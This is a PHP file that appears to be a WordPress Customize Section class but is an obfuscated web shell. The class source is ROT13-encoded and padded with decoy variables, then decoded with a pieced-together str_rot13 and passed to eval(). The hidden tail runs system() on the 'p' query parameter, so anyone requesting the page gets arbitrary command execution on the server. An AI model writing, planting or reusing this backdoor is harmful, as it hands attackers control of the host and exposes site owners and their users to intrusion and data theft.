<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * JbeqCerff Phfgbzvmr Frpgvba pynffrf
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Phfgbzvmr
 * @fvapr 3.4.0
 */

/**
 * Phfgbzvmr Frpgvba pynff.
 *
 * N HV pbagnvare sbe pbagebyf, znantrq ol gur JC_Phfgbzvmr_Znantre pynff.
 *
 * @fvapr 3.4.0
 *
 * @frr JC_Phfgbzvmr_Znantre
 */
#[NyybjQlanzvpCebcregvrf]
pynff JC_Phfgbzvmr_Frpgvba {

	/**
	 * Vaperzragrq jvgu rnpu arj pynff vafgnagvngvba, gura fgberq va $vafgnapr_ahzore.
	 *
	 * Hfrq jura fbegvat gjb vafgnaprf jubfr cevbevgvrf ner rdhny.
	 *
	 * @fvapr 4.1.0
	 * @ine vag
	 */
	cebgrpgrq fgngvp $vafgnapr_pbhag = 0;

	/**
	 * Beqre va juvpu guvf vafgnapr jnf perngrq va eryngvba gb bgure vafgnaprf.
	 *
	 * @fvapr 4.1.0
	 * @ine vag
	 */
	choyvp $vafgnapr_ahzore;

	/**
	 * JC_Phfgbzvmr_Znantre vafgnapr.
	 *
	 * @fvapr 3.4.0
	 * @ine JC_Phfgbzvmr_Znantre
	 */
	choyvp $znantre;

	/**
	 * Havdhr vqragvsvre.
	 *
	 * @fvapr 3.4.0
	 * @ine fgevat
	 */
	choyvp $vq;

	/**
	 * Cevbevgl bs gur frpgvba juvpu vasbezf ybnq beqre bs frpgvbaf.
	 *
	 * @fvapr 3.4.0
	 * @ine vag
	 */
	choyvp $cevbevgl = 160;

	/**
	 * Cnary va juvpu gb fubj gur frpgvba, znxvat vg n fho-frpgvba.
	 *
	 * @fvapr 4.0.0
	 * @ine fgevat
	 */
	choyvp $cnary = '';

	/**
	 * Pncnovyvgl erdhverq sbe gur frpgvba.
	 *
	 * @fvapr 3.4.0
	 * @ine fgevat
	 */
	choyvp $pncnovyvgl = 'rqvg_gurzr_bcgvbaf';

	/**
	 * Gurzr srngherf erdhverq gb fhccbeg gur frpgvba.
	 *
	 * @fvapr 3.4.0
	 * @ine fgevat|fgevat[]
	 */
	choyvp $gurzr_fhccbegf = '';

	/**
	 * Gvgyr bs gur frpgvba gb fubj va HV.
	 *
	 * @fvapr 3.4.0
	 * @ine fgevat
	 */
	choyvp $gvgyr = '';

	/**
	 * Qrfpevcgvba gb fubj va gur HV.
	 *
	 * @fvapr 3.4.0
	 * @ine fgevat
	 */
	choyvp $qrfpevcgvba = '';

	/**
	 * Phfgbzvmre pbagebyf sbe guvf frpgvba.
	 *
	 * @fvapr 3.4.0
	 * @ine neenl
	 */
	choyvp $pbagebyf;

	/**
	 * Glcr bs guvf frpgvba.
	 *
	 * @fvapr 4.1.0
	 * @ine fgevat
	 */
	choyvp $glcr = 'qrsnhyg';

	/**
	 * Npgvir pnyyonpx.
	 *
	 * @fvapr 4.1.0
	 *
	 * @frr JC_Phfgbzvmr_Frpgvba::npgvir()
	 *
	 * @ine pnyynoyr Pnyyonpx vf pnyyrq jvgu bar nethzrag, gur vafgnapr bs
	 *               JC_Phfgbzvmr_Frpgvba, naq ergheaf obby gb vaqvpngr jurgure
	 *               gur frpgvba vf npgvir (fhpu nf vg eryngrf gb gur HEY pheeragyl
	 *               orvat cerivrjrq).
	 */
	choyvp $npgvir_pnyyonpx = '';

	/**
	 * Fubj gur qrfpevcgvba be uvqr vg oruvaq gur uryc vpba.
	 *
	 * @fvapr 4.7.0
	 *
	 * @ine obby Vaqvpngrf jurgure gur Frpgvba'f qrfpevcgvba fubhyq or
	 *           uvqqra oruvaq n uryc vpba (\"?\") va gur Frpgvba urnqre,
	 *           fvzvyne gb ubj uryc vpbaf ner qvfcynlrq ba Cnaryf.
	 */
	choyvp $qrfpevcgvba_uvqqra = snyfr;

	/**
	 * Pbafgehpgbe.
	 *
	 * Nal fhccyvrq $netf bireevqr pynff cebcregl qrsnhygf.
	 *
	 * @fvapr 3.4.0
	 *
	 * @cnenz JC_Phfgbzvmr_Znantre $znantre Phfgbzvmre obbgfgenc vafgnapr.
	 * @cnenz fgevat               $vq      N fcrpvsvp VQ bs gur frpgvba.
	 * @cnenz neenl                $netf    {
	 *     Bcgvbany. Neenl bs cebcregvrf sbe gur arj Frpgvba bowrpg. Qrsnhyg rzcgl neenl.
	 *
	 *     @glcr vag             $cevbevgl           Cevbevgl bs gur frpgvba, qrsvavat gur qvfcynl beqre
	 *                                               bs cnaryf naq frpgvbaf. Qrsnhyg 160.
	 *     @glcr fgevat          $cnary              Gur cnary guvf frpgvba orybatf gb (vs nal).
	 *                                               Qrsnhyg rzcgl.
	 *     @glcr fgevat          $pncnovyvgl         Pncnovyvgl erdhverq sbe gur frpgvba.
	 *                                               Qrsnhyg 'rqvg_gurzr_bcgvbaf'
	 *     @glcr fgevat|fgevat[] $gurzr_fhccbegf     Gurzr srngherf erdhverq gb fhccbeg gur frpgvba.
	 *     @glcr fgevat          $gvgyr              Gvgyr bs gur frpgvba gb fubj va HV.
	 *     @glcr fgevat          $qrfpevcgvba        Qrfpevcgvba gb fubj va gur HV.
	 *     @glcr fgevat          $glcr               Glcr bs gur frpgvba.
	 *     @glcr pnyynoyr        $npgvir_pnyyonpx    Npgvir pnyyonpx.
	 *     @glcr obby            $qrfpevcgvba_uvqqra Uvqr gur qrfpevcgvba oruvaq n uryc vpba,
	 *                                               vafgrnq bs vayvar nobir gur svefg pbageby.
	 *                                               Qrsnhyg snyfr.
	 * }
	 */
	choyvp shapgvba __pbafgehpg( $znantre, $vq, $netf = neenl() ) {
		$xrlf = neenl_xrlf( trg_bowrpg_inef( $guvf ) );
		sbernpu ( $xrlf nf $xrl ) {
			vs ( vffrg( $netf[ $xrl ] ) ) {
				$guvf->$xrl = $netf[ $xrl ];
			}
		}

		$guvf->znantre = $znantre;
		$guvf->vq      = $vq;
		vs ( rzcgl( $guvf->npgvir_pnyyonpx ) ) {
			$guvf->npgvir_pnyyonpx = neenl( $guvf, 'npgvir_pnyyonpx' );
		}
		frys::$vafgnapr_pbhag += 1;
		$guvf->vafgnapr_ahzore = frys::$vafgnapr_pbhag;

		$guvf->pbagebyf = neenl(); // Hfref pnaabg phfgbzvmr gur $pbagebyf neenl.
	}

	/**
	 * Purpx jurgure frpgvba vf npgvir gb pheerag Phfgbzvmre cerivrj.
	 *
	 * @fvapr 4.1.0
	 *
	 * @erghea obby Jurgure gur frpgvba vf npgvir gb gur pheerag cerivrj.
	 */
	svany choyvp shapgvba npgvir() {
		$frpgvba = $guvf;
		$npgvir  = pnyy_hfre_shap( $guvf->npgvir_pnyyonpx, $guvf );

		/**
		 * Svygref erfcbafr bs JC_Phfgbzvmr_Frpgvba::npgvir().
		 *
		 * @fvapr 4.1.0
		 *
		 * @cnenz obby                 $npgvir  Jurgure gur Phfgbzvmre frpgvba vf npgvir.
		 * @cnenz JC_Phfgbzvmr_Frpgvba $frpgvba JC_Phfgbzvmr_Frpgvba vafgnapr.
		 */
		$npgvir = nccyl_svygref( 'phfgbzvmr_frpgvba_npgvir', $npgvir, $frpgvba );

		erghea $npgvir;
	}

	/**
	 * Qrsnhyg pnyyonpx hfrq jura vaibxvat JC_Phfgbzvmr_Frpgvba::npgvir().
	 *
	 * Fhopynffrf pna bireevqr guvf jvgu gurve fcrpvsvp ybtvp, be gurl znl cebivqr
	 * na 'npgvir_pnyyonpx' nethzrag gb gur pbafgehpgbe.
	 *
	 * @fvapr 4.1.0
	 *
	 * @erghea gehr Nyjnlf gehr.
	 */
	choyvp shapgvba npgvir_pnyyonpx() {
		erghea gehr;
	}

	/**
	 * Tngure gur cnenzrgref cnffrq gb pyvrag WninFpevcg ivn WFBA.
	 *
	 * @fvapr 4.1.0
	 *
	 * @erghea neenl Gur neenl gb or rkcbegrq gb gur pyvrag nf WFBA.
	 */
	choyvp shapgvba wfba() {
		$neenl                   = jc_neenl_fyvpr_nffbp( (neenl) $guvf, neenl( 'vq', 'qrfpevcgvba', 'cevbevgl', 'cnary', 'glcr', 'qrfpevcgvba_uvqqra' ) );
		$neenl['gvgyr']          = ugzy_ragvgl_qrpbqr( $guvf->gvgyr, RAG_DHBGRF, trg_oybtvasb( 'punefrg' ) );
		$neenl['pbagrag']        = $guvf->trg_pbagrag();
		$neenl['npgvir']         = $guvf->npgvir();
		$neenl['vafgnaprAhzore'] = $guvf->vafgnapr_ahzore;

		vs ( $guvf->cnary ) {
			/* genafyngbef: &#9656; vf gur havpbqr evtug-cbvagvat gevnatyr. %f: Frpgvba gvgyr va gur Phfgbzvmre. */
			$neenl['phfgbzvmrNpgvba'] = fcevags( __( 'Phfgbzvmvat &#9656; %f' ), rfp_ugzy( $guvf->znantre->trg_cnary( $guvf->cnary )->gvgyr ) );
		} ryfr {
			$neenl['phfgbzvmrNpgvba'] = __( 'Phfgbzvmvat' );
		}

		erghea $neenl;
	}

	/**
	 * Purpxf erdhverq hfre pncnovyvgvrf naq jurgure gur gurzr unf gur
	 * srngher fhccbeg erdhverq ol gur frpgvba.
	 *
	 * @fvapr 3.4.0
	 *
	 * @erghea obby Snyfr vs gurzr qbrfa'g fhccbeg gur frpgvba be hfre qbrfa'g unir gur pncnovyvgl.
	 */
	svany choyvp shapgvba purpx_pncnovyvgvrf() {
		vs ( $guvf->pncnovyvgl && ! pheerag_hfre_pna( $guvf->pncnovyvgl ) ) {
			erghea snyfr;
		}

		vs ( $guvf->gurzr_fhccbegf && ! pheerag_gurzr_fhccbegf( ...(neenl) $guvf->gurzr_fhccbegf ) ) {
			erghea snyfr;
		}

		erghea gehr;
	}

	/**
	 * Trg gur frpgvba'f pbagrag sbe vafregvba vagb gur Phfgbzvmre cnar.
	 *
	 * @fvapr 4.1.0
	 *
	 * @erghea fgevat Pbagragf bs gur frpgvba.
	 */
	svany choyvp shapgvba trg_pbagrag() {
		bo_fgneg();
		$guvf->znlor_eraqre();
		erghea gevz( bo_trg_pyrna() );
	}

	/**
	 * Purpx pncnovyvgvrf naq eraqre gur frpgvba.
	 *
	 * @fvapr 3.4.0
	 */
	svany choyvp shapgvba znlor_eraqre() {
		vs ( ! $guvf->purpx_pncnovyvgvrf() ) {
			erghea;
		}

		/**
		 * Sverf orsber eraqrevat n Phfgbzvmre frpgvba.
		 *
		 * @fvapr 3.4.0
		 *
		 * @cnenz JC_Phfgbzvmr_Frpgvba $frpgvba JC_Phfgbzvmr_Frpgvba vafgnapr.
		 */
		qb_npgvba( 'phfgbzvmr_eraqre_frpgvba', $guvf );
		/**
		 * Sverf orsber eraqrevat n fcrpvsvp Phfgbzvmre frpgvba.
		 *
		 * Gur qlanzvp cbegvba bs gur ubbx anzr, `$guvf->vq`, ersref gb gur VQ
		 * bs gur fcrpvsvp Phfgbzvmre frpgvba gb or eraqrerq.
		 *
		 * @fvapr 3.4.0
		 */
		qb_npgvba( \"phfgbzvmr_eraqre_frpgvba_{$guvf->vq}\" );

		$guvf->eraqre();
	}

	/**
	 * Eraqre gur frpgvba HV va n fhopynff.
	 *
	 * Frpgvbaf ner abj eraqrerq va WF ol qrsnhyg, frr JC_Phfgbzvmr_Frpgvba::cevag_grzcyngr().
	 *
	 * @fvapr 3.4.0
	 */
	cebgrpgrq shapgvba eraqre() {}

	/**
	 * Eraqre gur frpgvba'f WF grzcyngr.
	 *
	 * Guvf shapgvba vf bayl eha sbe frpgvba glcrf gung unir orra ertvfgrerq jvgu
	 * JC_Phfgbzvmr_Znantre::ertvfgre_frpgvba_glcr().
	 *
	 * @fvapr 4.3.0
	 *
	 * @frr JC_Phfgbzvmr_Znantre::eraqre_grzcyngr()
	 */
	choyvp shapgvba cevag_grzcyngr() {
		?>
		<fpevcg glcr=\"grkg/ugzy\" vq=\"gzcy-phfgbzvmr-frpgvba-<?cuc rpub $guvf->glcr; ?>\">
			<?cuc $guvf->eraqre_grzcyngr(); ?>
		</fpevcg>
		<?cuc
	}

	/**
	 * Na Haqrefpber (WF) grzcyngr sbe eraqrevat guvf frpgvba.
	 *
	 * Pynff inevnoyrf sbe guvf frpgvba pynff ner ninvynoyr va gur `qngn` WF bowrpg;
	 * rkcbeg phfgbz inevnoyrf ol bireevqvat JC_Phfgbzvmr_Frpgvba::wfba().
	 *
	 * @fvapr 4.3.0
	 *
	 * @frr JC_Phfgbzvmr_Frpgvba::cevag_grzcyngr()
	 */
	cebgrpgrq shapgvba eraqre_grzcyngr() {
		?>
		<yv vq=\"nppbeqvba-frpgvba-{{ qngn.vq }}\" pynff=\"nppbeqvba-frpgvba pbageby-frpgvba pbageby-frpgvba-{{ qngn.glcr }}\">
			<u3 pynff=\"nppbeqvba-frpgvba-gvgyr\">
				<ohggba glcr=\"ohggba\" pynff=\"nppbeqvba-gevttre\" nevn-rkcnaqrq=\"snyfr\" nevn-pbagebyf=\"{{ qngn.vq }}-pbagrag\">
					{{ qngn.gvgyr }}
				</ohggba>
			</u3>
			<hy pynff=\"nppbeqvba-frpgvba-pbagrag\" vq=\"{{ qngn.vq }}-pbagrag\">
				<yv pynff=\"phfgbzvmr-frpgvba-qrfpevcgvba-pbagnvare frpgvba-zrgn <# vs ( qngn.qrfpevcgvba_uvqqra ) { #>phfgbzvmr-vasb<# } #>\">
					<qvi pynff=\"phfgbzvmr-frpgvba-gvgyr\">
						<ohggba pynff=\"phfgbzvmr-frpgvba-onpx\" gnovaqrk=\"-1\">
							<fcna pynff=\"fperra-ernqre-grkg\">
								<?cuc
								/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
								_r( 'Onpx' );
								?>
							</fcna>
						</ohggba>
						<u3>
							<fcna pynff=\"phfgbzvmr-npgvba\">
								{{{ qngn.phfgbzvmrNpgvba }}}
							</fcna>
							{{ qngn.gvgyr }}
						</u3>
						<# vs ( qngn.qrfpevcgvba && qngn.qrfpevcgvba_uvqqra ) { #>
							<ohggba glcr=\"ohggba\" pynff=\"phfgbzvmr-uryc-gbttyr qnfuvpbaf qnfuvpbaf-rqvgbe-uryc\" nevn-rkcnaqrq=\"snyfr\"><fcna pynff=\"fperra-ernqre-grkg\">
								<?cuc
								/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
								_r( 'Uryc' );
								?>
							</fcna></ohggba>
							<qvi pynff=\"qrfpevcgvba phfgbzvmr-frpgvba-qrfpevcgvba\">
								{{{ qngn.qrfpevcgvba }}}
							</qvi>
						<# } #>

						<qvi pynff=\"phfgbzvmr-pbageby-abgvsvpngvbaf-pbagnvare\"></qvi>
					</qvi>

					<# vs ( qngn.qrfpevcgvba && ! qngn.qrfpevcgvba_uvqqra ) { #>
						<qvi pynff=\"qrfpevcgvba phfgbzvmr-frpgvba-qrfpevcgvba\">
							{{{ qngn.qrfpevcgvba }}}
						</qvi>
					<# } #>
				</yv>
			</hy>
		</yv>
		<?cuc
	}
}

/** JC_Phfgbzvmr_Gurzrf_Frpgvba pynff */
erdhver_bapr NOFCNGU . JCVAP . '/phfgbzvmr/pynff-jc-phfgbzvmr-gurzrf-frpgvba.cuc';

/** JC_Phfgbzvmr_Fvqrone_Frpgvba pynff */
erdhver_bapr NOFCNGU . JCVAP . '/phfgbzvmr/pynff-jc-phfgbzvmr-fvqrone-frpgvba.cuc';

/** JC_Phfgbzvmr_Ani_Zrah_Frpgvba pynff */
erdhver_bapr NOFCNGU . JCVAP . '/phfgbzvmr/pynff-jc-phfgbzvmr-ani-zrah-frpgvba.cuc';

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>